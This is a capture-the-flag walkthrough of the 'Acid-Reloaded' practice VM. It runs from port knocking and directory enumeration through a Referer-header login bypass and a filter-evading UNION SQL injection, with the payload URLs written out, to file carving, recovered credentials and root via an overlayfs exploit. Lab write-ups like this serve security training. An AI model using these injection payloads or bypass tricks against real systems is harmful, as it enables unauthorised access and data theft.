    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____
   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \
  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
 / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/

                                                                        -by Acid

-----------------------------------

So, getting started, I setup the VM to pull an address from my DHCP server, started a packet capture and promptly started an nmap scan.  At first glance, only SSH is open and nothing conclusive showed up in the PCAP.  

Following is the result of the nmap scan:

------------------------------------------------------------------
Host is up (0.014s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.o
rg/cgi-bin/servicefp-submit.cgi :
SF-Port22-TCP:V=6.40%I=7%D=9/1%Time=55E5DF5B%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,"SSH-2\.0-OpenSSH_6\.7p1\x20Ubuntu-5ubuntu1\.3\r\n");
------------------------------------------------------------------

As there is only SSH open, it's worth seeing if there is a service banner:
------------------------------------------------------------------
    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____
   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \
  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
 / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/

                                                                        -by Acid

Wanna Knock me out ???
3.2.1 Let's Start the Game.

------------------------------------------------------------------

The capitalization and usage of /Knock/ makes me think there is some port knocking involved in this challenge.  Let's test knocking TCP ports 3 -> 2 -> 1:

knock <HOST> 3 2 1 

Following up with a second nmap scan produced:

------------------------------------------------------------------
Host is up (0.018s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     (protocol 2.0)
33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port22-TCP:V=6.40%I=7%D=9/1%Time=55E5E349%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,"SSH-2\.0-OpenSSH_6\.7p1\x20Ubuntu-5ubuntu1\.3\r\n");
------------------------------------------------------------------


Huzzah! Port 33447 is now open and running on it isApache.  Initial checks for ./robots.txt yielded no results.  Dirbuster scanning shows shows:

------------------------------------------------------------------
{Dirbuster NG 0.1} (c)2012 WintermeW
FOUND 10.0.0.141:33447// (response code 200)
FOUND 10.0.0.141:33447/bin (response code 200)
------------------------------------------------------------------


At the index of /bin we are greeted with a wonderful login prompt.  I initially started by running sqlmap, in the hopes that it would really be that easy.  However, it didn't produce any results.  So, onto dirs3arch for further directory enumeration:

[15:38:01] Starting:
[15:38:01] 200 -    1KB - /bin/index.php
[15:38:01] 200 -  309B  - /bin/error.php
[15:38:01] 200 -  309B  - /bin/error.php
[17:38:02] 200 -  675B  - /bin/dashboard.php
[15:39:04] 403 -  302B  - /bin/.htpasswds
[15:39:53] 403 -  308B  - /bin/crack/.htpasswds
[20:01:58] 302 -    0B  - /bin/includes/logout.php  ->  ../index.php
[20:01:59] 302 -    0B  - /bin/includes/validation.php  ->  ../error.php?err=Could not process login


Moving back to the login prompt, I started testing to see how the login works.  Upon submission of 
credentials:

------------------------------------------------------------------
<input type="submit" value="Login" onclick="formhash(this.form, this.form.password);" /> 
------------------------------------------------------------------

The following network reques is generated from the login

--------------------------------------------
POST /bin/includes/validation.php HTTP/1.1
Host: <HOST>:33447
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: sec_session_id=jljo1tq6ljs1tq5e1v3to2rc41
Connection: keep-alive

Content-Type: application/x-www-form-urlencoded
Content-Length: 154

email=testing&password=&p=521b9ccefbcd14d179e7a1bb877752870a6d620938b28a66a107eac6e6805b9d0989f45b5730508041aa5e710847d439ea74cd312c9355f1f2dae08d40e41d50

------------------------------------------------------------------

A failed login results in:

------------------------------------------------------------------
GET /bin/index.php?error=1
Host: <HOST>:33447
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: sec_session_id=9vvaihsbba8m8pid92vb66k292
Connection: keep-alive
--------------------------------------------

It looks like the password is being hashed before being sent.  So, I pointed sqlmap at validation.php  (in order to test possible injections in all of the fields [without the password field being hashed[).  Again, no results.

Following the chain of events, I started trying to see if changing value sent in 'error=' sent back to index.php would impact anything.  [It didn't]

I'm going to skip over the half hour or so I spent trying to exploit:

http://<HOST>:33447/bin/error.php

My initial hopes were that there would either be SQL injection or a PHP inclusion vulnerability.

Looking at files found form brute forceing, I haven't looked at dashboard.php yet.  The "You are not authorized to access this page.", makes me think that this is where you are redirected after a successful login.  After running sqlmap and some other tools in an attempt to trigger any results, I was left without any solid leads. 

Next step was to try replicate as much as possible of a successful login request.  I started guessing various parameters that would indicate a successful login: login=success, login=1, beg=1.  Also started editing the cookie value to null or arbitrary values.

During testing, I added the header Referer: http://<HOST>:33447/bin/includes/validation.php, in order to as accurately as possible match what the request may look like.

And we're in.

------------------------------------------------------------------
Come'on bang your head here. Click.
- http://<HOST>:334/bin/l33t_haxor.php
------------------------------------------------------------------

Within the source of the page is:

------------------------------------------------------------------
<a href="l33t_haxor.php?id=" style="text-decoration:none"></a> <h3></font>
------------------------------------------------------------------

So testing various integers the following is shown:
http://<HOST>:33447/bin/l33t_haxor.php?id=1

The following quotes are shown:
01) The hacker community may be small, but it possesses the skills that are driving the global economies of the future.
02) Younger hackers are hard to classify. They're probably just as diverse as the old hackers are. We're all over the map.
03) Most hackers are young because young people tend to be adaptable. As long as you remain adaptable, you can always be a good hacker.
04) As a matter of fact, yeah, they were foolproof. The problem is that you don't have to protect yourself against fools. You have to protect yourself against people like me.
05) Never underestimate the determination of a kid who is time-rich and cash-poor.
06) Most hackers are young because young people tend to be adaptable. As long as you remain adaptable, you can always be a good hacker. 
07) What hackers do is figure out technology and experiment with it in ways many people never imagined. They also have a strong desire to share this information with others and to explain it to people who
08) My actions constituted pure hacking that resulted in relatively trivial expenses for the companies involved, despite.
09) Hacking is a art of thinking outside the box in order to challenge the normal behaviour of application created by developers.
10) What is the difference between active recon and passive recon ???? 

At 11, the page is blank.  While incrementing through the values, I accidentally added a /'/ for good measure.  At this point we are greeted with a comforting SQL error:

------------------------------------------------------------------
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') ORDER BY Description ASC' at line 1
------------------------------------------------------------------

After spending a very long time, I finally managed to figure out the proper SQL injection: 
Many thanks to: https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/
------------------------------------------------------------------
http://<HOST>:33447/bin/l33t_haxor.php?id=2-1

http://<HOST>:33447/bin/l33t_haxor.php?id=-1')union(select(null),(@@version)from(information_schema.tables)WHERE'a'='a

http://<HOST>:33447/bin/l33t_haxor.php?id=-1%27%29union%28select%28null%29,GROUP_CONCAT%28DISTINCT%28table_schema%29%29from%28information_schema.tables%29WHERE%27a%27=%27a
-- information_schema,mysql,performance_schema,secure_login

http://<HOST>:33447/bin/l33t_haxor.php?id=-1%27%29union%28select%28null%29,%28user%28%29%29from%28information_schema.columns%29WHERE%27Description%27LIKE%27Description
-- root@localhost

http://<HOST>:33447/bin/l33t_haxor.php?id=-1%27%29union%28select%28null%29,GROUP_CONCAT%28DISTINCT%28table_name%29%29from%28information_schema.columns%29WHERE%28table_schema%29=database%28%29AND%27Description%27LIKE%27Description
-- UB3R/strcpy.exe,login_attempts,members,word

------------------------------------------------------------------

Standing out in the database is the table named 'UB3R/strcpy.exe'.  Adding both the path and individual words to dirbuster, yields the following:

------------------------------------------------------------------
http://<HOST>:33447//strcpy.exe 404
http://<HOST>:33447//bin/strcpy.exe 404
http://<HOST>:33447/bin/UB3R/ 404
http://<HOST>:33447/UB3R/ 403
http://<HOST>:33447//UB3R/strcpy.exe 200
------------------------------------------------------------------

The downloaded file named strcpy.exe has an MD5 hash of c4c0dfd75770c96b78bffe89d4cdedab and the `file` command shows “PDF document, version 1.5”.  My initial thoughts were that there was a embedded JS dropper.  Skipping over the not finding anything useful, after running strings I noticed “%%EOFRar!”.  Running `binwalk`, shows that at the end of the file was a RAR file appended to the end of the file:

------------------------------------------------------------------
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
529           0x211           Zlib compressed data, default compression, uncompressed size >= 184
857           0x359           JPEG image data, JFIF standard  1.01
887           0x377           TIFF image data, big-endian
28394         0x6EEA          Zlib compressed data, default compression, uncompressed size >= 654
28839         0x70A7          Zlib compressed data, default compression, uncompressed size >= 98304
108356        0x1A744         Zlib compressed data, default compression, uncompressed size >= 154
109264        0x1AAD0         RAR archive data
------------------------------------------------------------------
At the end of the file is a RAR archive.  Running rar x strcpy.exe extracts the files in the embedded RAR file.
------------------------------------------------------------------
RAR 5.21 beta 2   Copyright (c) 1993-2015 Alexander Roshal   31 Jan 2015
Trial version             Type RAR -? for help

Archive: strcpy.exe
Details: RAR 4, SFX

 Attributes      Size    Date   Time   Name
----------- ---------  -------- -----  ----
    ..A....        92  23-08-15 18:16  acid.txt    
    ..A....     60961  23-08-15 18:09  lol.jpg     
----------- ---------  -------- -----  ----
------------------------------------------------------------------

The file acid.txt contains:
------------------------------------------------------------------
You are at right track.

Don't loose hope..

Good Luck :-)

Kind & Best Regards,
Acid
------------------------------------------------------------------

Thanks, Acid!  Nice pep talk at this point.  

Onto the image, initial checking file details do not lead to any obvious results:
------------------------------------------------------------------
exiftool lol.jpg 
------------------------------------------------------------------
ExifTool Version Number         : 9.74
File Name                       : lol.jpg
Directory                       : .
File Size                       : 60 kB
File Modification Date/Time     : 2015:08:23 18:09:11-04:00
File Access Date/Time           : 2015:09:02 21:18:18-04:00
File Inode Change Date/Time     : 2015:09:02 21:15:38-04:00
File Permissions                : rw-rw-r--
File Type                       : JPEG
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 900
Image Height                    : 636
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 900x636
------------------------------------------------------------------

As I do a lot of malware analysis and so I'm always looking for any interesting strings that may allude to embedded functionality. At the end of the file I noticed the following:
------------------------------------------------------------------
Avinash.contact
...
hint.txt
`You have found a contact. Now, go and grab the details :-)
------------------------------------------------------------------

Again, running binwalk again, it appears there is a RAR file concatonated to the end of the file:
------------------------------------------------------------------
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard  1.01
60020         0xEA74          RAR archive data
------------------------------------------------------------------

Dumping the RAR, leads:

------------------------------------------------------------------
RAR 5.21 beta 2   Copyright (c) 1993-2015 Alexander Roshal   31 Jan 2015
Trial version             Type RAR -? for help

Archive: lol.jpg
Details: RAR 4, SFX

 Attributes      Size    Date   Time   Name
----------- ---------  -------- -----  ----
    ..A....      1662  23-08-15 17:10  Avinash.contact
    ..A....        62  23-08-15 17:11  hint.txt    
----------- ---------  -------- -----  ----
                 1724                  2
------------------------------------------------------------------

The hint.txt contains:
------------------------------------------------------------------
You have found a contact. Now, go and grab the details :-)
------------------------------------------------------------------

The Avinash.contact file contains an XML document.  I pulled out the following interesting strings:
------------------------------------------------------------------

AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA= (base64 encoded NooB@123)
acid.exploit@gmail.com
Makke
Avinash

So, at this point, it looks like we have the credentials acid.exploit@gmail.com\NooB@123. Going back, I tested this against the /bin/index.php page (which failed) and attempted it as SSH credentials.  After mixing around the above strings as possible SSH creds, I got a successful login with makke\NooB@123.

An initial directory listing shows;

makke@acid:~$ ls -lahtr
total 72K
drwxr-xr-x 4 root  root  4.0K Aug 24 19:11 ..
-rw-r--r-- 1 makke makke  675 Aug 24 19:11 .profile
-rw-r--r-- 1 makke makke 3.7K Aug 24 19:11 .bashrc
-rw-r--r-- 1 makke makke  220 Aug 24 19:11 .bash_logout
drwx------ 2 makke makke 4.0K Aug 24 21:25 .cache
-rw-rw-r-- 1 makke makke   40 Aug 24 21:28 .hint
-rw------- 1 makke makke  40K Sep  2 08:48 .mysql_history
drwxr-xr-x 3 makke makke 4.0K Sep  2 08:48 .
-rw------- 1 makke makke 1.8K Sep  2 09:22 .bash_history

The two standouts that I want to look at are .hint and .bash_history
------------------------------------------------------------------
.hint
------------------------------------------------------------------
Run the executable to own kingdom :-)
------------------------------------------------------------------

So, the logical jump is that I need to run some program and it'll give me root.  At this point, excitement passed proper protocol, so I started using `find` to find any recently added files:

------------------------------------------------------------------
makke@acid:~$ find / -type f -printf '%T@ %p\n' | sort -n | tail -1 | cut -f2- -d" "
makke@acid:~$ find /bin -type f -printf '%T@ %p\n' | sort -n | tail -1 | cut -f2- -d" "
/bin/overlayfs
makke@acid:~$ find /etc -type f -printf '%T@ %p\n' | sort -n | tail -1 | cut -f2- -d" "
/etc/vmware-tools/locations
makke@acid:~$ find /var -type f -printf '%T@ %p\n' | sort -n | tail -1 | cut -f2- -d" "
/var/log/syslog
….
------------------------------------------------------------------
Skipping over a lot of the “Permission Denied” and directories that didn't produce anything interesting, I ran:

/bin/overlayfs
------------------------------------------------------------------
-rwxr-xr-x 1 root root 12K Aug 24 21:22 /bin/overlayfs
------------------------------------------------------------------

The following is produced from running /bin/overlayfs
------------------------------------------------------------------
makke@acid:~$ /bin/overlayfs 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
# cd /root
# ls -lahtr
total 68K
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
drwx------  3 root root 4.0K Aug  6 15:51 .dbus
-rw-r--r--  1 root root   66 Aug  6 17:31 .selected_editor
drwx------  3 root root 4.0K Aug  6 17:55 .config
-rw-r--r--  1 root root 3.1K Aug  8 18:02 .bashrc
drwx------  2 root root 4.0K Aug 24 17:46 .cache
-rw-r--r--  1 root root  284 Aug 24 20:57 .flag.txt
drwxr-xr-x 22 root root 4.0K Aug 24 20:58 ..
-rw-------  1 root root 2.8K Aug 24 21:32 .mysql_history
drwx------  5 root root 4.0K Aug 24 21:32 .
-rw-------  1 root root  24K Aug 24 22:25 .bash_history
-rw-------  1 root root  147 Aug 24 23:32 .nano_history

# cat .flag.txt
Dear Hax0r,

You have completed the Challenge Successfully.

Your Flag is : [REDACTED]




// FTW
